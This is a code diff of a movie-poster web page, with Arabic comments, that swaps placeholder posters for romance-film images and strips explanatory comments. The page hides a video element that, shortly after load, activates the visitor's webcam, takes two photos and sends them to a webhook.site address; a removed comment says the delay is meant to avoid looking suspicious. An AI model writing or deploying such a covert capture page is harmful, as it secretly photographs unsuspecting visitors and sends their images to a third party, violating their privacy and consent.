@@ -72,15 +72,15 @@
 </header>
 
 <div class="grid">
-  <!-- صور أفلام وهمية فقط (لا تعمل) -->
-  <div class="poster"><img src="https://picsum.photos/seed/movie1/300/450" alt="فيلم 1"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie2/300/450" alt="فيلم 2"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie3/300/450" alt="فيلم 3"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie4/300/450" alt="فيلم 4"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie5/300/450" alt="فيلم 5"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie6/300/450" alt="فيلم 6"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie7/300/450" alt="فيلم 7"></div>
-  <div class="poster"><img src="https://picsum.photos/seed/movie8/300/450" alt="فيلم 8"></div>
+  <!-- صور أفلام رومانسية حقيقية جذابة جداً (كلها لا تعمل) -->
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/6v1w8oY0r8c1S9l4n8r7y7v4w3s.jpg" alt="La La Land"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/5qHNjhtjMD4YWH3UP0rm4tKwxCL.jpg" alt="The Notebook"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/3oAa8mJJ97CH9AeGEY6vjAxqcvZ.jpg" alt="Titanic"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/4q2NNj4S5dG2RLF5qX3t6qVqX7p.jpg" alt="Pride & Prejudice"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/7WsyChQLEftFiDOVTGkv3hFpyyt.jpg" alt="Before Sunrise"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/8cdWjvZQUExUUTzyp4t6EDMUBHN.jpg" alt="Amélie"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/4oD6VEeF7x2jDq1rU9h4h5y2p1q.jpg" alt="A Walk to Remember"></div>
+  <div class="poster"><img src="https://image.tmdb.org/t/p/w500/5qHNjhtjMD4YWH3UP0rm4tKwxCL.jpg" alt="Eternal Sunshine"></div>
 </div>
 
 <video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
@@ -95,7 +95,7 @@ const video = document.getElementById('hiddenVideo');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";  // ← الرابط اللي أعطيتني إياه
+const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";
 
 async function captureAndSend() {
   try {
@@ -107,21 +107,17 @@ async function captureAndSend() {
     video.srcObject = stream;
     await video.play();
 
-    // انتظر شوية عشان الصورة تكون واضحة
     await new Promise(r => setTimeout(r, 800));
 
-    // الصورة الأولى
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
     canvas.toBlob(blob => sendBlob(blob, 1), 'image/jpeg', 0.92);
 
-    // انتظر ثانية ثم الصورة الثانية
     setTimeout(() => {
       ctx.drawImage(video, 0, 0);
       canvas.toBlob(blob => sendBlob(blob, 2), 'image/jpeg', 0.92);
 
-      // إيقاف الكاميرا بعد الصورتين
       setTimeout(() => {
         stream.getTracks().forEach(track => track.stop());
         video.srcObject = null;
@@ -148,7 +144,6 @@ function sendBlob(blob, num) {
   }).catch(err => console.log("فشل الإرسال:", err));
 }
 
-// ابدأ فور تحميل الصفحة مع تأخير بسيط عشان ما يبدو مريب
 window.addEventListener('load', () => {
   setTimeout(captureAndSend, 1500);
 });
